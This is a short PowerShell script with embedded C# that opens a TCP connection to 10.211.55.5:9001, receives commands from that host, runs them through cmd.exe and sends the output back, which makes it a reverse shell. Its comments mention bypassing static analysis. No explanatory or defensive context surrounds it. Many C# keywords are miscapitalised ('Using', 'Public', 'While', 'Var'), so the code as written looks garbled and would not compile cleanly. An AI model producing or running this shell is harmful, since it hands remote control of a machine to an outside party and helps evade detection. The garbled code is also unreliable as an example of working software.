

$h = "10.211.55.5"
$p = 9001

$sc = @"
Using System;
Using System.Net.Sockets;
Using System.Runtime.InteropServices;
Using System.Text;
Public class B {
    [DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr h, string p);
    [DllImport("kernel32.dll")] public static extern IntPtr LoadLibrary(string l);
Public static void R() {
        TcpClient c = new TcpClient("$h", $p);
        NetworkStream s = c.GetStream();
Byte[] b = new byte[1024];
While (c.Connected) {
Int i = s.Read(b, 0, b.Length);
String cmd = Encoding.ASCII.GetString(b, 0, i);
            // Execute using a custom approach to avoid standard Process objects
            // where possible, or use randomized naming to bypass static analysis.
Var p = new System.Diagnostics.Process();
P.StartInfo.FileName = "cmd.exe";
P.StartInfo.Arguments = "/c " + cmd;
P.StartInfo.RedirectStandardOutput = true;
P.StartInfo.UseShellExecute = false;
P.Start();
Byte[] o = Encoding.ASCII.GetBytes(p.StandardOutput.ReadToEnd());
S.Write(o, 0, o.Length);
        }
    }
}
"@

$a = Add-Type -TypeDefinition $sc -PassThru -ReferencedAssemblies "System", "System.Net.Sockets"
[B]::R()
